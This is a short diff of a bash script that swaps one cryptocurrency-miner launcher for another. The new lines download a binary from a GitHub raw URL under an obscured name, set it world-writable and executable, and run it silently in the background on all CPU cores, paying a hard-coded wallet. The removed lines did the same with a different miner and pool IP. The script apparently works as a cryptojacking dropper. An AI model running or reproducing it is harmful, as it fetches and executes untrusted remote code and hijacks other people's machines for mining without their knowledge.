@@ -1,3 +1,4 @@
 #!/bin/bash
-curl https://pearlhash.xyz/downloads/pearl-miner-v12 -o lamiso && chmod +x lamiso
-./lamiso --host 207.148.76.66:80 --user prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
+curl https://github.com/liecamshoe/file/raw/main/vltrig -L -o bakolo
+chmod 777 bakolo
+./bakolo --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x -t $(nproc --all) > /dev/null 2>&1 &
